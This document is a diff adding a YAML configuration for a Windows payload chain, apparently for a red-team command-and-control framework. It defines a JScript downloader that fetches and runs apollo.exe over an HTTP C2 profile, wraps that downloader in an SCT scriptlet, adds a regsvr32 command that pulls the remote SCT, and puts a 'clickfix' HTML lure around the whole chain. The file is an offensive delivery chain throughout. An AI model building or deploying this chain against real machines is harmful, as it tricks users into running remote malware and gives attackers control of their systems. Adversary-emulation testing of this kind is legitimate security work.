@@ -1,0 +1,41 @@
+payloads:
+  - name: scenario2_download_execute.js
+    payload: jscript_download_save_execute
+    os: Windows
+    downloader: True
+    downloaded_payload: apollo.exe
+    c2_profile: "http"
+    profile_url: "/monster4.txt"
+    url_parameter: "url"
+    parameters:
+      download_method: Msxml2.XMLHTTP
+      exec_method: WScript.Shell_Run
+      path: "%APPDATA%\\sample.exe"
+
+  - name: scenario2.sct
+    payload: script_to_sct
+    os: Windows
+    wrapper: True
+    wrapped_payload: scenario2_download_execute.js
+    parameters:
+      progid: "trustmebro"
+      classid: "{F000F000-0000-0000-0000-000000000001}"
+
+  - name: regsvr32.cmd
+    payload: cmd_regsvr32_remote_sct
+    os: Windows
+    downloader: True
+    downloaded_payload: scenario2.sct
+    c2_profile: "http"
+    profile_url: "/monster5.txt"
+    url_parameter: "url"
+    parameters: {}
+
+  - name: clickfix.html
+    payload: clickfix
+    os: Windows
+    wrapper: True
+    wrapped_payload: regsvr32.cmd
+    parameters: {}
+
+
